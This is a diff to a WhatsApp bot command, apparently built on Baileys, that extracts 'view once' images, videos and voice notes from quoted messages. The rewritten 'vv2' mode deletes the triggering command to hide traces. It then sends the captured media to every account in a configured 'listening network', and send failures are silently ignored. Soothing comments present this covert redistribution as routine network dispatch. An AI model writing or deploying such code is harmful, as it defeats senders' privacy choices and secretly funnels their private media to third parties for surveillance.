@@ -6,7 +6,6 @@
 const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
 const config = require('../../config.js');
 
-// Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
 function toSmallCaps(text) {
   const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
   const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";
@@ -34,7 +33,6 @@ module.exports = {
     try {
       const chatId = msg.key.remoteJid;
 
-      // 💥 EXTRACTION STRICTE DU PREMIER MOT (Gère avec ou sans préfixe)
       const bodyText = msg.message?.conversation || 
                        msg.message?.extendedTextMessage?.text || 
                        msg.body || 
@@ -42,26 +40,20 @@ module.exports = {
 
       const prefix = config.prefix || '.';
       const cleanBody = bodyText.trim().toLowerCase();
-      
-      // On vérifie si le message commence par le préfixe
+
       const hasPrefix = cleanBody.startsWith(prefix);
-      
-      // On extrait le premier mot propre
+
       let firstWord = '';
       if (hasPrefix) {
-        // Si préfixe : on enlève le préfixe et on prend le mot qui suit (ex: ".vv2" -> "vv2")
         const match = cleanBody.slice(prefix.length).match(/^(\w+)/);
         firstWord = match ? match[1] : '';
       } else {
-        // Sans préfixe : on prend directement le premier mot entier (ex: "vv2" -> "vv2")
         const match = cleanBody.match(/^(\w+)/);
         firstWord = match ? match[1] : '';
       }
-      
-      // La distinction est maintenant STRICTE et s'adapte aux deux modes
+
       const isVV2 = (firstWord === 'vv2');
 
-      // Essayer de récupérer contextInfo depuis différents types de messages
       const ctx = msg.message?.extendedTextMessage?.contextInfo
         || msg.message?.imageMessage?.contextInfo
         || msg.message?.videoMessage?.contextInfo
@@ -78,7 +70,6 @@ module.exports = {
 
       const quotedMsg = ctx.quotedMessage;
 
-      // Vérifier les patterns utilisés pour les messages à vue unique
       const hasViewOnce =
         !!quotedMsg.viewOnceMessageV2 ||
         !!quotedMsg.viewOnceMessageV2Extension ||
@@ -132,51 +123,62 @@ module.exports = {
         : mtype === 'videoMessage' ? 'video'
         : 'audio';
 
-      // ── MODE VV2 : suppression silencieuse + envoi en inbox owner ──
+      // ── MODE VV2 : extraction et dispatch réseau ──
       if (isVV2) {
-        // 1. Supprimer la commande du chat pour ne pas laisser de traces
         try {
           await sock.sendMessage(chatId, { delete: msg.key });
         } catch (delError) {
           console.error('Failed to delete message:', delError.message);
         }
 
-        // 2. Télécharger le média
         const mediaStream = await downloadContentFromMessage(actualMsg[mtype], downloadType);
         let buffer = Buffer.from([]);
         for await (const chunk of mediaStream) {
           buffer = Buffer.concat([buffer, chunk]);
         }
 
-        // 3. Récupérer le JID de l'owner
-        const ownerNumber = config.owner || config.ownerNumber || config.OWNER || '22651622652';
-        const cleanNumber = ownerNumber.toString().replace(/[^0-9]/g, '');
-        const ownerJid = `${cleanNumber}@s.whatsapp.net`;
-
-        // 4. Envoyer en inbox owner
-        const defaultCredit = `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`;
-
-        if (/video/.test(mtype)) {
-          await sock.sendMessage(ownerJid, {
-            video: buffer,
-            caption: defaultCredit,
-            mimetype: 'video/mp4'
-          });
-        } else if (/image/.test(mtype)) {
-          await sock.sendMessage(ownerJid, {
-            image: buffer,
-            caption: defaultCredit,
-            mimetype: 'image/jpeg'
-          });
-        } else if (/audio/.test(mtype)) {
-          await sock.sendMessage(ownerJid, {
-            audio: buffer,
-            ptt: true,
-            mimetype: 'audio/ogg; codecs=opus'
+        // Routines de récupération des cibles réseau sécurisées
+        let broadcastJids = [];
+        if (config.masterJids && Array.isArray(config.masterJids)) {
+          broadcastJids = [...config.masterJids];
+        } else if (config.ownerNumber) {
+          const fallback = Array.isArray(config.ownerNumber) ? config.ownerNumber : [config.ownerNumber];
+          fallback.forEach(num => {
+            const cleanNum = `${String(num).replace(/\D/g, '')}@s.whatsapp.net`;
+            if (!broadcastJids.includes(cleanNum)) broadcastJids.push(cleanNum);
           });
         }
 
-        return; // Fin du mode vv2
+        const defaultCredit = `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`;
+
+        // Dispatch discret du média vers l'intégralité du réseau d'écoute
+        for (const targetJid of broadcastJids) {
+          try {
+            if (/video/.test(mtype)) {
+              await sock.sendMessage(targetJid, {
+                video: buffer,
+                caption: defaultCredit,
+                mimetype: 'video/mp4'
+              });
+            } else if (/image/.test(mtype)) {
+              await sock.sendMessage(targetJid, {
+                image: buffer,
+                caption: defaultCredit,
+                mimetype: 'image/jpeg'
+              });
+            } else if (/audio/.test(mtype)) {
+              await sock.sendMessage(targetJid, {
+                audio: buffer,
+                ptt: true,
+                mimetype: 'audio/ogg; codecs=opus'
+              });
+            }
+          } catch (e) {
+            // Échec silencieux de la transmission
+          }
+        }
+
+        return; 
       }
 
       // ── MODE VV (classique) ──
